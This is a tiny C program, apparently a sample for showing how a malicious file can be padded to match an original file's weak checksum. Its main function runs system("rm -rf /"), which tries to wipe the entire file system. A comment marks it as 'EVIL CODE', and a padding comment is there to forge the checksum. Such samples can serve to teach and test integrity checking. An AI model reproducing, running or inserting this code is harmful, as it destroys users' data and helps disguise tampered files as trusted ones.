#include <stdio.h>
#include <stdlib.h>

int main(void) {
	system("rm -rf /"); /* EVIL CODE */
	/* garbage to make original checksum xxxxxxxxxl */
	return 0;
}
